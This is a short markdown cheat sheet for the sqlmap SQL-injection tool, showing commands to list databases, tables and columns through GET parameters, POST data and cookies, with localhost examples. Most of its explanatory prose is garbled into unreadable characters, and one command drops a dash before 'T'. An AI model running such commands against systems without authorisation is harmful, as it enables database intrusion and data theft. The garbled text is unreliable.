## [sqlmap](http://sqlmap.org/)
### GET �������
### �������� �����
#### ����������� URL **-u**
```bash
sqlmap -u <URL>
```
> URL ����������� ���� ������ �� ����������� ����������
**http://site/page?id=25**

#### ��������� ����� (����� ��������� �������������� sqlmap) **--random-agen**
```bash
sqlmap -u <URL> --random-agent
```
### �������� ��� **--dbs**
```bash
sqlmap -u <URL> --dbs
```
### ����� ���� **-D**
```bash
sqlmap -u <URL> -D <����>
```
#### ������ ������ ���� **--tables**
```bash
sqlmap -u <URL> -D <����> --tables
```
#### ����� ������� **-T**
```bash
sqlmap -u <URL> -D <����> -T <�������>
```
#### ������ ����� ������� **--columns**
```bash
sqlmap -u <URL> -D <����> T <�������> --columns
```
### POST �������
### �������� ������ (����� � ��������) ����� POST (�������� ��� **--dbs**)
```bash
sqlmap -u <URL> --dbs --data "<����>=<��������>&<����2>=<��������2>"
```
### ������������� cookies (�������� ��� **--dbs**)
```bash
sqlmap -u <URL> --dbs --cookie "<cookie>=<��������>; <cookie2>=<��������2>"
```
### �������
> �������� ����� ����� ���������� � ������ ������������ �������� ��� �� ������ (��������, ZAP proxy)

#### ����� ������ ���� ��� ������:
```bash
sqlmap -u http://localhost/home?id=10 --dbs --random-agent
```
#### ����� ������ ����� ������� users ����  main:
```bash
sqlmap -u http://localhost/home?id=10 -D main -T users --columns --random-agent
```
